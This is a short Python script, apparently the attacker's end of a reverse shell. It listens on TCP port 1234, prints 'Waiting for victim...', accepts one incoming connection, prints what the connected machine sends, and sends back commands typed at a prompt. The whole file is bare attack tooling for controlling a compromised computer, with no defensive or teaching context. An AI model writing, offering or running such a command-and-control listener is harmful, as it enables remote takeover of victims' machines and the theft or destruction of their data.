import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(('0.0.0.0', 1234))
s.listen(1)
print("Waiting for victim...")
conn, addr = s.accept()
print(f"Connected by {addr}")
while True:
    data = conn.recv(1024)
    if not data: break
    print(data.decode(), end='')
    cmd = input("> ")
    conn.send(cmd.encode() + b"\n")